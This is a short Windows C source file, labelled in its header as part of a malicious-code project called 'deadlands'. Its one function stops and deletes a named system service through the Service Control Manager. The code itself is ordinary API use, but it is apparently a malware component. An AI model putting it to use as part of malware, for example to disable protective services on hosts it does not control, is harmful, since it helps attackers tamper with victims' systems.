/*
** Malicious code - project: deadlands
** Filename: removeService.c
*/

#include <windows.h>
#include <stdio.h>
#include "service.h"

int					RemoveService(char **args)
{
    SC_HANDLE       hSCManager;
   	HANDLE			hService;
    SERVICE_STATUS	status;

	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hSCManager)
	{
		printf("[ERROR]: Can't open SCManager (%d)\r\n", GetLastError());
		return (-1);
	}

	hService = OpenService(hSCManager, args[0], SERVICE_ALL_ACCESS);
	if (!hService)
	{
		fprintf(stderr, "[ERROR]: Can't open service (%d)\r\n", GetLastError());
		return (-1);
	 }
	if (!ControlService(hService, SERVICE_CONTROL_STOP, &status))
	{
		fprintf(stderr, "[ERROR]: Can't control service (%d)\r\n", GetLastError());
		CloseServiceHandle(hService);
		return (-1);
	}
	if (!DeleteService(hService))
	{
		fprintf(stderr, "[ERROR]: Can't delete service (%d)\r\n", GetLastError());
		CloseServiceHandle(hService);
		return (-1);
	}
	CloseServiceHandle(hService);
	return (0);
}
